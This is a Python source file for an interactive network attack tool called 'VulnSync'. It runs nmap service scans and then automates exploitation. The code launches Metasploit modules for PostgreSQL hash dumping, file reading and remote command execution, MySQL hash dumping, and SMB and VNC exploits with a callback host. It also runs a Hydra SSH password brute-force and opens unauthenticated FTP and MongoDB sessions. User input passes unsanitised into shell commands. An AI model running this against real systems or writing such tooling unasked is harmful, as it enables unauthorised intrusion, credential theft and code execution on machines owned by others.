# main_script.py
import os
import subprocess
from styles import RESET, BOLD, LCYAN, RED, LPURPLE, GREEN
from vulnerability_checker import check_and_display_vulnerabilities
from datetime import datetime

def grep_string_in_file(string_to_find, file_path):
    """Check if the specified string is found in the given file."""
    try:
        with open(file_path, 'r') as file:
            for line in file:
                if string_to_find in line:
                    return True
        return False
    except FileNotFoundError:
        print(f"File '{file_path}' not found.")
        return False

def main():

    if os.geteuid() != 0:
        print(f"{RED}This script must be run as root. Please use 'sudo'.{RESET}")
        exit(1)
        
    output_file = "output.txt"
    output_file_1 = "result.log"
    output_file_2 = "result.txt"

    def handle_option():
        try:
            run_scan_loop = True
            scan_type_selected = False

            while run_scan_loop:
                hosts = "clear"
                os.system(hosts)

                print(f"{LCYAN}{BOLD}"
      """
                _         __                     
 /\   /\ _   _ | | _ __  / _\ _   _  _ __    ___ 
 \ \ / /| | | || || '_ \ \ \ | | | || '_ \ /  __|
  \ V / | |_| || || | | |_\ \| |_| || | | || (__ 
   \_/   \__,_||_||_| |_|\__/ \__, ||_| |_| \___|
                              |___/              
      """
      f"{RESET}")

                if not scan_type_selected:
                    while True:
                        print(f"{BOLD}1. {LCYAN}Fast Scan{RESET} ")
                        print(f"{BOLD}2. {LCYAN}Full Scan{RESET} ")
                        print(f"{BOLD}3. {LCYAN}Top Port Scan{RESET} ")
                        print(f"{BOLD}4. {LCYAN}UDP Scan{RESET} ")
                        scan_type = input("\nChoose scan type : ").lower()
                        if scan_type in ['1', '2', '3', '4']:
                            scan_type_selected = True
                            break
                        else:
                            print("\nInvalid input. Please choose 1, 2, 3, or 4.\n")

                if os.path.exists(output_file):
                    print("")
                    print(f"{BOLD}{LCYAN}Open Port:{RESET} ")
                    os.system(f"grep --color open {output_file}")
                    print("")
                    print(f"{BOLD}{LCYAN}Close Port:{RESET} ")
                    os.system(f"grep --color 'filtered\\|closed' {output_file}")
                    print("")
                else:
                    print("")
                    ip = input("Enter the target IP/URL: ")
                    print("")
                    if scan_type == '1':
                        command = f"sudo nmap -T4 -F {ip} -oN {output_file}"
                    elif scan_type == '2':
                        command = f"sudo nmap -sV -sC -T4 -p- -oA fullscan {ip} -oN {output_file}"
                    elif scan_type == '3':
                        command = f"sudo nmap -sV -sC -T4 --top-ports 100 {ip} -oN {output_file}"
                    else:
                        command = f"sudo nmap -Pn -sU -sV -sC --top-ports=20 {ip} -oN {output_file}"
                    print(f"{GREEN}Starting!!!\n{RESET}")
                    print(f"{LCYAN}On Progress!!! (Please be patient)\n{RESET}")
                    print("+++=======================================================+++\n")
                    
                    # Get the current time before running the scan
                    start_time = datetime.now()

                    try:
                        with open(os.devnull, 'w') as nullfile:
                            subprocess.check_call(command, shell=True, stdout=nullfile, stderr=nullfile)
                    except subprocess.CalledProcessError:
                        print("Error occurred while running the Nmap scan.")
                        print("")
                    
                    # Get the time after the scan finishes
                    end_time = datetime.now()
                    
                    # Calculate the duration of the scan
                    duration = end_time - start_time

                    print(f"{BOLD}{LCYAN}Open Port:{RESET} ")
                    os.system(f"grep --color open {output_file}")
                    print("")
                    print(f"{BOLD}{LCYAN}Close Port:{RESET} ")
                    os.system(f"grep --color 'filtered\\|closed' {output_file}")
                    print("")

                    # Display the time the scan was completed
                    print(f"Scan completed at: {end_time.strftime('%Y-%m-%d %H:%M:%S')}")
                    print(f"Scan duration: {duration}\n")

                ports = input("Enter the ports to scan (e.g., 22): ")
                print("")

                # Main
                if "22" in ports.split(','):
                    print("")
                    print(
                        f"{LCYAN}Scanning SSH Vulnerability...\n{RESET}")
                    command = f"sudo nmap -p22 -sC -Pn -sV --script ssh2-enum-algos --script ssh-auth-methods {ip} -oN result.txt"

                    start_time_1 = datetime.now()
                    try:
                        with open(os.devnull, 'w') as nullfile:
                            subprocess.check_call(command, shell=True,
                                                  stdout=nullfile, stderr=nullfile)
                    except subprocess.CalledProcessError:
                        print("Error occurred while running the Nmap scan.")
                        print("")
                    check_and_display_vulnerabilities("result.txt")

                    end_time_1 = datetime.now()

                    duration_1 = end_time_1 - start_time_1

                    total_time = duration + duration_1

                    print(f"Scan completed at: {end_time_1.strftime('%Y-%m-%d %H:%M:%S')}")
                    print(f"Scan duration: {duration_1}\n")
                    print(f"Total duration: {total_time}\n")

                elif "21" in ports.split(','):
                    print("")
                    print(
                        f"{LCYAN}Scanning FTP Vulnerability...\n{RESET}")
                    command = f"sudo nmap -sV -p21 -sC -A -Pn --script=ftp-anon {ip} -oN result.txt"

                    start_time_1 = datetime.now()

                    try:
                        with open(os.devnull, 'w') as nullfile:
                            subprocess.check_call(command, shell=True,
                                                  stdout=nullfile, stderr=nullfile)
                    except subprocess.CalledProcessError:
                        print("Error occurred while running the Nmap scan.")
                        print("")
                    vulnerabilities_found = check_and_display_vulnerabilities(
                        "result.txt")
                    
                    end_time_1 = datetime.now()

                    duration_1 = end_time_1 - start_time_1

                    total_time = duration + duration_1

                    print(f"Scan completed at: {end_time_1.strftime('%Y-%m-%d %H:%M:%S')}")
                    print(f"Scan duration: {duration_1}\n")
                    print(f"Total duration: {total_time}\n")

                    # Prompt the user for exploitation after displaying all vulnerabilities
                    print("")
                    if vulnerabilities_found:

                        exploit_choice = input(
                            f"{LCYAN}Do you want to exploit any of the vulnerabilities? {RESET}(yes/no): ").lower()

                        # Check user's choice and call the function accordingly
                        if exploit_choice == 'yes':

                            metasploit_command = f"ftp anonymous@{ip}"
                            print("")
                            print(f"{LCYAN}Notes: {RESET}")
                            print(f"{LCYAN}Insert Password: {RESET}anonymous")
                            print(f"{LCYAN}List Directory: {RESET}ls -a")
                            print(f"{LCYAN}Get File: {RESET}mget *")
                            print(f"{LCYAN}Exit: {RESET}bye")
                            print(f"")
                            os.system(metasploit_command)

                            print("")
                            print("")
                            print(
                                f"{RED}Vulnerability {RESET}Anonymous FTP login allowed = {GREEN}VALID {RESET}")

                            print("")
                            print(f"{LCYAN}Thanks For Using This Tool! {RESET}")

                        elif exploit_choice == 'no':
                            print("Not exploiting any vulnerabilities.")
                        else:
                            print("Invalid choice. Please enter 'yes' or 'no'.")
                    else:
                        print(
                            "No vulnerabilities found with minimum or low severity.")

                elif "23" in ports.split(','):
                    print("")
                    print(f"{LCYAN}Scanning TELNET Vulnerability...\n{RESET}")
                    command = f"sudo nmap -n -sV -Pn --script \"*telnet* and safe\" -p 23 {ip} -oN result.txt"

                    start_time_1 = datetime.now()
                    try:
                        with open(os.devnull, 'w') as nullfile:
                            subprocess.check_call(command, shell=True,
                                                  stdout=nullfile, stderr=nullfile)
                    except subprocess.CalledProcessError:
                        print("Error occurred while running the Nmap scan.")
                        print("")
                    vulnerabilities_found = check_and_display_vulnerabilities("result.txt")

                    end_time_1 = datetime.now()

                    duration_1 = end_time_1 - start_time_1

                    total_time = duration + duration_1

                    print(f"Scan completed at: {end_time_1.strftime('%Y-%m-%d %H:%M:%S')}")
                    print(f"Scan duration: {duration_1}\n")
                    print(f"Total duration: {total_time}\n")
                    if vulnerabilities_found:
                        exploit_choice = input(
                            f"{LCYAN}Do you want to exploit any of the vulnerabilities? {RESET}(yes/no): ").lower()

                        # Check user's choice and call the function accordingly
                        if exploit_choice == 'yes':
                            metasploit_command = f"nc -vn {ip} 23"
                            print(f"")
                            os.system(metasploit_command)
                        elif exploit_choice == 'no':
                            print("Not exploiting any vulnerabilities.")
                        else:
                            print("Invalid choice. Please enter 'yes' or 'no'.")
                    else:
                        print("No vulnerabilities found with minimum or low severity.")

                elif "25" in ports.split(','):
                    print("")
                    print(f"{LCYAN}Scanning SMTP Vulnerability...\n{RESET}")
                    metasploit_command = f"msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_enum; set RHOSTS {ip}; set RHOST {ip}; set RPORT 25; set USER_FILE /usr/share/seclists/Usernames/top-usernames-shortlist.txt; spool result.log; run; exit'"

                    start_time_1 = datetime.now()
                    os.system(metasploit_command)

                    try:
                        with open(os.devnull, 'w') as nullfile:
                            subprocess.check_call(command, shell=True,
                                                  stdout=nullfile, stderr=nullfile)
                    except subprocess.CalledProcessError:
                        print("Error occurred.")
                        print("")
                    check_and_display_vulnerabilities("result.log")

                    end_time_1 = datetime.now()

                    duration_1 = end_time_1 - start_time_1

                    total_time = duration + duration_1

                    print(f"Scan completed at: {end_time_1.strftime('%Y-%m-%d %H:%M:%S')}")
                    print(f"Scan duration: {duration_1}\n")
                    print(f"Total duration: {total_time}\n")
                    # Check if the specified string is found in the result.log file
                    if grep_string_in_file("Users found", "result.log"):
                        user = input("===>> Insert User? ")
                        print("")
                        print(f"{LCYAN}Bruteforce Password SSH...\n{RESET}")
                        hydra_command = f"hydra -t 16 -l {user} -P /usr/share/wordlists/rockyou.txt {ip} ssh > result.txt"
                        os.system(hydra_command)

                        grep_command = r"grep -m 1 '\[22\]\[ssh\]' result.txt"
                        print("")
                        os.system(grep_command)

                        try:
                            with open(os.devnull, 'w') as nullfile:
                                subprocess.check_call(command, shell=True,
                                                      stdout=nullfile, stderr=nullfile)
                        except subprocess.CalledProcessError:
                            print("Error occurred.")
                            print("")
                        check_and_display_vulnerabilities("result.txt")
                    else:
                        print("Users not found.")

                elif "80" in ports.split(',') or "443" in ports.split(','):
                    print("")
                    print(f"{LCYAN}Scanning HTTP/HTTPS Vulnerability...\n{RESET}")
                    command = f"sudo nmap -T4 --reason -Pn -sV -p 80,443 --script='banner,(http* or ssl*) and not (brute or broadcast or dos or external or http-slowloris* or fuzzer)' {ip} -oN result.txt"

                    start_time_1 = datetime.now()
                    try:
                        with open(os.devnull, 'w') as nullfile:
                            subprocess.check_call(command, shell=True,
                                                  stdout=nullfile, stderr=nullfile)
                    except subprocess.CalledProcessError:
                        print("Error occurred while running the Nmap scan.")
                        print("")
                    vulnerabilities_found = check_and_display_vulnerabilities("result.txt")

                    end_time_1 = datetime.now()
                    duration_1 = end_time_1 - start_time_1
                    total_time = duration + duration_1

                    print(f"Scan completed at: {end_time_1.strftime('%Y-%m-%d %H:%M:%S')}")
                    print(f"Scan duration: {duration_1}\n")
                    print(f"Total duration: {total_time}\n")

                elif "139" in ports.split(',') or "445" in ports.split(','):
                    print(
                        "+++=======================================================+++\n")
                    print(
                        f"{LCYAN}Scanning SMB Vulnerability...\n{RESET}")
                    command = f"sudo nmap -p 139,445 -vv -Pn --script smb-security-mode.nse --script smb2-security-mode --script smb-vuln* --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse {ip} -oN result.txt -vv"

                    start_time_1 = datetime.now()
                    try:
                        with open(os.devnull, 'w') as nullfile:
                            subprocess.check_call(command, shell=True,
                                                  stdout=nullfile, stderr=nullfile)
                    except subprocess.CalledProcessError:
                        print("Error occurred while running the Nmap scan.")
                        print("")
                    vulnerabilities_found = check_and_display_vulnerabilities(
                        "result.txt")

                    end_time_1 = datetime.now()
                    duration_1 = end_time_1 - start_time_1
                    total_time = duration + duration_1

                    print(f"Scan completed at: {end_time_1.strftime('%Y-%m-%d %H:%M:%S')}")
                    print(f"Scan duration: {duration_1}\n")
                    print(f"Total duration: {total_time}\n")
                    # Prompt the user for exploitation after displaying all vulnerabilities
                    if vulnerabilities_found:
                        exploit_choice = input(
                            f"{LCYAN}Do you want to exploit any of the vulnerabilities? {RESET}(yes/no): ").lower()

                        # Check user's choice and call the function accordingly
                        if exploit_choice == 'yes':

                            print("")
                            selected_vulnerability = input(
                                "Which Vulnerability You Need to Exploit? ")
                            ip = input("IP/URL Target? ")
                            selected_lhost = input(
                                "IP/URL Your Device/VPN (Default en0)? ").lower()

                            print("")

                            metasploit_command = f"msfconsole -q -x 'search {selected_vulnerability}; use 0; set RHOSTS {ip}; set RHOST {ip}; set RPORT 445; set LHOST {selected_lhost}; run; exit'"
                            os.system(metasploit_command)

                            print("")

                        elif exploit_choice == 'no':
                            print("Not exploiting any vulnerabilities.")
                        else:
                            print("Invalid choice. Please enter 'yes' or 'no'.")
                    else:
                        print(
                            "\nNo vulnerabilities found with minimum or low severity.")

                elif "6379" in ports.split(','):
                    print("")
                    print(
                        f"{LCYAN}Scanning Redis Vulnerability...\n{RESET}")
                    command = f"sudo nmap -p 6379 --script redis-info {ip} -oN result.txt -vv"

                    start_time_1 = datetime.now()
                    try:
                        with open(os.devnull, 'w') as nullfile:
                            subprocess.check_call(command, shell=True,
                                                  stdout=nullfile, stderr=nullfile)
                    except subprocess.CalledProcessError:
                        print("Error occurred while running the Nmap scan.")
                        print("")
                    vulnerabilities_found = check_and_display_vulnerabilities(
                        "result.txt")

                    end_time_1 = datetime.now()
                    duration_1 = end_time_1 - start_time_1
                    total_time = duration + duration_1

                    print(f"Scan completed at: {end_time_1.strftime('%Y-%m-%d %H:%M:%S')}")
                    print(f"Scan duration: {duration_1}\n")
                    print(f"Total duration: {total_time}\n")
                    # Prompt the user for exploitation after displaying all vulnerabilities
                    if vulnerabilities_found:
                        exploit_choice = input(
                            f"{LCYAN}Do you want to exploit any of the vulnerabilities? {RESET}(yes/no): ").lower()

                        # Check user's choice and call the function accordingly
                        if exploit_choice == 'yes':
                            print("")
                            ip = input("IP/URL Target? ")
                            print("")

                            metasploit_command = f"msfconsole -q -x 'use scanner/redis/redis_login; set RHOSTS {ip}; set RHOST {ip}; set RPORT 6379; run; exit'"
                            os.system(metasploit_command)

                        elif exploit_choice == 'no':
                            print("Not exploiting any vulnerabilities.")
                        else:
                            print("Invalid choice. Please enter 'yes' or 'no'.")
                    else:
                        print(
                            "No vulnerabilities found with minimum or low severity.")

                elif "5800" in ports.split(',') or "5801" in ports.split(',') or "5900" in ports.split(',') or "5901" in ports.split(','):
                    print("")
                    print(
                        f"{LCYAN}Scanning VNC Vulnerability...\n{RESET}")
                    command = f"sudo nmap -p 5800,5801,5900,5901 -Pn --script vnc-info,realvnc-auth-bypass,vnc-title {ip} -oN result.txt -vv"

                    start_time_1 = datetime.now()
                    try:
                        with open(os.devnull, 'w') as nullfile:
                            subprocess.check_call(command, shell=True,
                                                  stdout=nullfile, stderr=nullfile)
                    except subprocess.CalledProcessError:
                        print("Error occurred while running the Nmap scan.")
                        print("")
                    vulnerabilities_found = check_and_display_vulnerabilities(
                        "result.txt")

                    end_time_1 = datetime.now()
                    duration_1 = end_time_1 - start_time_1
                    total_time = duration + duration_1

                    print(f"Scan completed at: {end_time_1.strftime('%Y-%m-%d %H:%M:%S')}")
                    print(f"Scan duration: {duration_1}\n")
                    print(f"Total duration: {total_time}\n")
                    # Prompt the user for exploitation after displaying all vulnerabilities
                    if vulnerabilities_found:
                        exploit_choice = input(
                            f"{LCYAN}Do you want to exploit any of the vulnerabilities? {RESET}(yes/no): ").lower()

                        # Check user's choice and call the function accordingly
                        if exploit_choice == 'yes':

                            print("")
                            selected_vulnerability = input(
                                "Which Vulnerability You Need to Exploit? ")
                            ip = input("IP/URL Target? ")
                            selected_lhost = input(
                                "IP/URL Your Device/VPN (Default en0)? ").lower()

                            print("")

                            metasploit_command = f"msfconsole -q -x 'search {selected_vulnerability}; use 0; set RHOSTS {ip}; set RHOST {ip}; set RPORT 5900; set LHOST {selected_lhost}; run; exit'"
                            os.system(metasploit_command)

                        elif exploit_choice == 'no':
                            print("Not exploiting any vulnerabilities.")
                        else:
                            print("Invalid choice. Please enter 'yes' or 'no'.")
                    else:
                        print(
                            "No vulnerabilities found with minimum or low severity.")

                elif "27017" in ports.split(',') or "27018" in ports.split(','):
                    print("")
                    print(f"{LCYAN}Scanning MongoDB Vulnerability...\n{RESET}")
                    command = f"sudo nmap -sV -p 27018,27017 -sC -A -Pn --script= mongodb-info {ip} -oN result.txt"

                    start_time_1 = datetime.now()
                    try:
                        with open(os.devnull, 'w') as nullfile:
                            subprocess.check_call(command, shell=True,
                                                  stdout=nullfile, stderr=nullfile)
                    except subprocess.CalledProcessError:
                        print("Error occurred while running the Nmap scan.")
                        print("")
                    vulnerabilities_found = check_and_display_vulnerabilities("result.txt")

                    end_time_1 = datetime.now()
                    duration_1 = end_time_1 - start_time_1
                    total_time = duration + duration_1

                    print(f"Scan completed at: {end_time_1.strftime('%Y-%m-%d %H:%M:%S')}")
                    print(f"Scan duration: {duration_1}\n")
                    print(f"Total duration: {total_time}\n")
                    # Prompt the user for exploitation after displaying all vulnerabilities
                    print("")
                    if vulnerabilities_found:
                        exploit_choice = input(
                            f"{LCYAN}Do you want to exploit any of the vulnerabilities? {RESET}(yes/no): ").lower()

                        # Check user's choice and call the function accordingly
                        if exploit_choice == 'yes':
                            metasploit_command = f"mongo {ip}"
                            print("")
                            print(f"{LCYAN}MongoDB Commnads: {RESET}")
                            print(f"{LCYAN}show dbs {RESET}")
                            print(f"{LCYAN}use <db>{RESET}")
                            print(f"{LCYAN}show collections{RESET}")
                            print(f"{LCYAN}db.<collection>.find(){RESET}")
                            print(f"{LCYAN}db.<collection>.count(){RESET}")
                            print(f"")
                            os.system(metasploit_command)

                            print("")
                            print("")
                            print(f"{RED}Vulnerability {RESET}MongoDB Database Found Without Authentication = {GREEN}VALID {RESET}")

                            print("")
                            print(f"{LCYAN}Thanks For Using This Tool! {RESET}")

                        elif exploit_choice == 'no':
                            print("Not exploiting any vulnerabilities.")
                        else:
                            print("Invalid choice. Please enter 'yes' or 'no'.")
                    else:
                        print("No vulnerabilities found with minimum or low severity.")

                elif "5432" in ports.split(',') or "5433" in ports.split(','):
                    print("")
                    print(f"{LCYAN}Scanning PostgreSQL Vulnerability...\n{RESET}")
                    metasploit_command = f"msfconsole -q -x 'use auxiliary/scanner/postgres/postgres_login; set RHOSTS {ip}; set RHOST {ip}; set RPORT {ports}; spool result.log; run; exit'"

                    start_time_1 = datetime.now()
                    os.system(metasploit_command)

                    try:
                        with open(os.devnull, 'w') as nullfile:
                            subprocess.check_call(command, shell=True,
                                                  stdout=nullfile, stderr=nullfile)
                    except subprocess.CalledProcessError:
                        print("Error occurred.")
                        print("")
                    check_and_display_vulnerabilities("result.log")

                    end_time_1 = datetime.now()
                    duration_1 = end_time_1 - start_time_1
                    total_time = duration + duration_1

                    print(f"Scan completed at: {end_time_1.strftime('%Y-%m-%d %H:%M:%S')}")
                    print(f"Scan duration: {duration_1}\n")
                    print(f"Total duration: {total_time}\n")
                    # Check if the specified string is found in the result.log file
                    if grep_string_in_file("Login Successful", "result.log"):
                        user = input("\n===>> Insert User?  ")
                        password = input("===>> Insert Password?  ")
                        selected_lhost = input("===>> IP/URL Your Device/VPN (Default en0)?  ")
                        print("\nWhat's Next?\n")
                        print("1. Dumping User Hashes\n")
                        print("2. View Files\n")
                        print("3. Arbitrary Command Execution\n")
                        postgresql_next = input("===>> Choose Your Next Level?  ")

                        # Check the user's choice and perform the corresponding action
                        if postgresql_next == '1':
                            print(f"{LCYAN}Dumping user hashes...\n{RESET}")
                            metasploit_command = f"msfconsole -q -x 'use auxiliary/scanner/postgres/postgres_hashdump; set RHOSTS {ip}; set RHOST {ip}; set RPORT {ports}; set USERNAME {user}; set PASSWORD {password};spool result.log; run; exit'"
                            os.system(metasploit_command)
                        elif postgresql_next == '2':
                            print(f"{LCYAN}Viewing files...\n{RESET}")
                            metasploit_command = f"msfconsole -q -x 'use auxiliary/admin/postgres/postgres_readfile; set RHOSTS {ip}; set RHOST {ip}; set RPORT {ports}; set USERNAME {user}; set PASSWORD {password};spool result.log; run; exit'"
                            os.system(metasploit_command)
                        elif postgresql_next == '3':
                            print(f"{LCYAN}Executing arbitrary commands...\n{RESET}")
                            metasploit_command = f"msfconsole -q -x 'use multi/postgres/postgres_copy_from_program_cmd_exec; set RHOSTS {ip}; set RHOST {ip}; set RPORT {ports}; set USERNAME {user};set LHOST {selected_lhost}; set PASSWORD {password};spool result.log; run; exit'"
                            os.system(metasploit_command)
                        else:
                            print("Invalid choice. Please choose a valid option (1, 2, or 3).")
                    else:
                        print("Users not found.")

                elif "3389" in ports.split(','):
                    print("")
                    print(f"{LCYAN}Scanning RDP Vulnerability...\n{RESET}")
                    command = f"sudo nmap --script 'rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info' -p 3389 -T4 {ip} -oN result.txt"

                    start_time_1 = datetime.now()
                    try:
                        with open(os.devnull, 'w') as nullfile:
                            subprocess.check_call(command, shell=True,
                                                  stdout=nullfile, stderr=nullfile)
                    except subprocess.CalledProcessError:
                        print("Error occurred while running the Nmap scan.")
                        print("")
                    vulnerabilities_found = check_and_display_vulnerabilities("result.txt")

                    end_time_1 = datetime.now()
                    duration_1 = end_time_1 - start_time_1
                    total_time = duration + duration_1

                    print(f"Scan completed at: {end_time_1.strftime('%Y-%m-%d %H:%M:%S')}")
                    print(f"Scan duration: {duration_1}\n")
                    print(f"Total duration: {total_time}\n")
                    print("")
                    hosts = f"grep -q -oh 'Target_Name' result.txt"
                    os.system(hosts)
                    hosts = f"grep -q -oh 'NetBIOS_Domain_Name' result.txt"
                    os.system(hosts)
                    hosts = f"grep -q -oh 'NetBIOS_Computer_Name' result.txt"
                    os.system(hosts)
                    hosts = f"grep -q -oh 'DNS_Domain_Name' result.txt"
                    os.system(hosts)
                    hosts = f"grep -q -oh 'DNS_Computer_Name' result.txt"
                    os.system(hosts)

                elif "3306" in ports.split(','):
                    print("")
                    print(f"{LCYAN}Scanning MySQL Vulnerability...\n{RESET}")
                    command = f"sudo nmap -Pn -sV --script=mysql-databases.nse,mysql-empty-password.nse,mysql-enum.nse,mysql-info.nse,mysql-variables.nse,mysql-vuln-cve2012-2122.nse,mysql-dump-hashes -p 3306 {ip} -oN result.txt -vv"

                    start_time_1 = datetime.now()
                    try:
                        with open(os.devnull, 'w') as nullfile:
                            subprocess.check_call(command, shell=True,
                                                  stdout=nullfile, stderr=nullfile)
                    except subprocess.CalledProcessError:
                        print("Error occurred while running the Nmap scan.")
                        print("")
                    vulnerabilities_found = check_and_display_vulnerabilities("result.txt")

                    end_time_1 = datetime.now()
                    duration_1 = end_time_1 - start_time_1
                    total_time = duration + duration_1

                    print(f"Scan completed at: {end_time_1.strftime('%Y-%m-%d %H:%M:%S')}")
                    print(f"Scan duration: {duration_1}\n")
                    print(f"Total duration: {total_time}\n")
                    if vulnerabilities_found:
                        exploit_choice = input(f"{LCYAN}Do you want to exploit any of the vulnerabilities? {RESET}(yes/no): ").lower()

                        if exploit_choice == 'yes':
                            print("")
                            ip = input("IP/URL Target? ")
                            print("")

                            metasploit_command = f"msfconsole -q -x 'use scanner/mysql/mysql_hashdump; set RHOSTS {ip}; set RHOST {ip}; set username root; run; exit'"
                            os.system(metasploit_command)

                            print("")
                        elif exploit_choice == 'no':
                            print("Not exploiting any vulnerabilities.")
                        else:
                            print("Invalid choice. Please enter 'yes' or 'no'.")
                    else:
                        print("\nNo vulnerabilities found with minimum or low severity.")

                # Add other port checks similarly...
                
                # vulnerabilities_found = check_and_display_vulnerabilities(
                #         "result.txt")

                retry_option = input(
                    "\n===>> Do you want to scan another port (y) or exit the program (exit): ").lower()
                if retry_option == 'exit':
                    run_scan_loop = False
            if os.path.exists(output_file):
                os.remove(output_file)
        except KeyboardInterrupt:
            print("\nKeyboard interrupt detected. Exiting...")
            if os.path.exists(output_file):
                os.remove(output_file)
                os.remove(output_file_2)

    handle_option()

if __name__ == "__main__":
    main()